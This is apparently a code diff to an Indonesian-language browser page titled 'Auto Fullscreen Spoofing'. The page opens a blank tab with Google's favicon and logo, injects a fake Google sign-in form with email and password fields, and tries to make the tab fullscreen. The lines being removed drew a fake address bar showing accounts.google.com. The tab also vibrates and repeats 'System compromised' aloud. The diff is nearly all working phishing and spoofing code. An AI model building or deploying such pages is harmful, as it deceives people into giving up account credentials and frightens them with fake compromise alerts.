@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Instant Address Spoofing</title>
+<title>Auto Fullscreen Spoofing</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
@@ -19,8 +19,8 @@ button:disabled { background: #555; cursor: not-allowed; }
 
 <body>
 <div class="panel" id="main-panel">
-    <h1>⚠️ INSTANT SPOOFING</h1>
-    <p>Memicu UI Spoofing instan tanpa delay port.</p>
+    <h1>⚠️ AUTO FULLSCREEN SPOOFING</h1>
+    <p>Memicu tab baru dengan layar penuh (Fullscreen) tanpa Address Bar palsu.</p>
     
     <button id="start-btn" type="button">Mulai Spoofing</button>
     
@@ -54,7 +54,7 @@ startBtn.addEventListener("click", function() {
 
     efekHacker();
 
-    statusDiv.textContent = "Memicu Instant Spoofing...";
+    statusDiv.textContent = "Memicu Auto Fullscreen Spoofing...";
 
     // Buka tab kosong secara instan
     const w = window.open('about:blank', '_blank');
@@ -74,26 +74,14 @@ startBtn.addEventListener("click", function() {
         link.href = 'https://www.google.com/favicon.ico';
         w.document.head.appendChild(link);
 
-        // 2. HISTORY API (Mencoba ubah URL asli)
-        try { w.history.replaceState({}, '', 'https://accounts.google.com/signin'); } catch(e) {}
-
-        // 3. SUNTIKKAN UI PALSU + FAKE ADDRESS BAR (karena URL asli diblokir Chrome)
+        // 2. SUNTIKKAN KONTEN LOGIN PALSU (TANPA FAKE ADDRESS BAR)
         w.document.body.style.margin = "0";
         w.document.body.style.padding = "0";
         w.document.body.style.background = "#fff";
         w.document.body.style.fontFamily = "Arial, sans-serif";
         
         w.document.body.innerHTML = `
-            <!-- FAKE ADDRESS BAR (Menempel di atas) -->
-            <div style="background:#e8eaed; padding:10px 15px; display:flex; align-items:center; border-bottom:1px solid #dadce0; position:fixed; top:0; left:0; width:100%; box-sizing:border-box; z-index:9999;">
-                <div style="background:#fff; border-radius:20px; padding:8px 15px; display:flex; align-items:center; width:100%; box-shadow:0 1px 3px rgba(0,0,0,0.1);">
-                    <span style="color:#5f6368; margin-right:10px; font-size:16px;">🔒</span>
-                    <span style="color:#202124; font-size:14px; font-weight:bold;">https://accounts.google.com/signin</span>
-                </div>
-            </div>
-
-            <!-- KONTEN LOGIN PALSU -->
-            <div style="display:flex; align-items:center; justify-content:center; height:100vh; text-align:center; background:#fff; padding-top:60px; box-sizing:border-box;">
+            <div style="display:flex; align-items:center; justify-content:center; height:100vh; text-align:center; background:#fff;">
                 <div style="width:100%; max-width:400px; padding:20px;">
                     <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" style="width:200px; margin-bottom:20px;">
                     <h2 style="font-size:20px; font-weight:normal; margin-bottom:20px; color:#202124;">Sign in</h2>
@@ -101,10 +89,20 @@ startBtn.addEventListener("click", function() {
                     <input type="email" placeholder="Email or phone" style="width:100%; padding:13px 15px; margin-bottom:15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none;">
                     <input type="password" placeholder="Password" style="width:100%; padding:13px 15px; margin-bottom:15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none;">
                     <button style="width:100%; padding:12px; background:#1a73e8; color:#fff; border:none; border-radius:4px; font-size:16px; font-weight:bold; cursor:pointer;">Next</button>
-                    <p style="color:#f00; font-size:10px; margin-top:20px;">Instant Spoof by Waguri</p>
+                    <p style="color:#f00; font-size:10px; margin-top:20px;">Auto Fullscreen by Waguri</p>
                 </div>
             </div>
         `;
+
+        // 3. AUTO FULLSCREEN DI TAB BARU
+        try {
+            if (w.document.documentElement.requestFullscreen) {
+                w.document.documentElement.requestFullscreen().catch(function(e) {
+                    // Fullscreen mungkin diblokir jika tidak ada gesture di tab baru
+                    console.log("Fullscreen diblokir:", e);
+                });
+            }
+        } catch(e) {}
 
         // 4. GETAR & TTS DI TAB BARU
         w.eval(`
@@ -112,7 +110,7 @@ startBtn.addEventListener("click", function() {
             if ('speechSynthesis' in window) { setInterval(function() { var msg = new SpeechSynthesisUtterance('System compromised'); msg.lang = 'en-US'; window.speechSynthesis.speak(msg); }, 3000); }
         `);
 
-        statusDiv.textContent = "Berhasil! UI Palsu telah disuntikkan secara instan.";
+        statusDiv.textContent = "Berhasil! Tab baru telah dibuka dengan Auto Fullscreen.";
         statusDiv.style.color = '#4CAF50';
 
     } catch(e) {
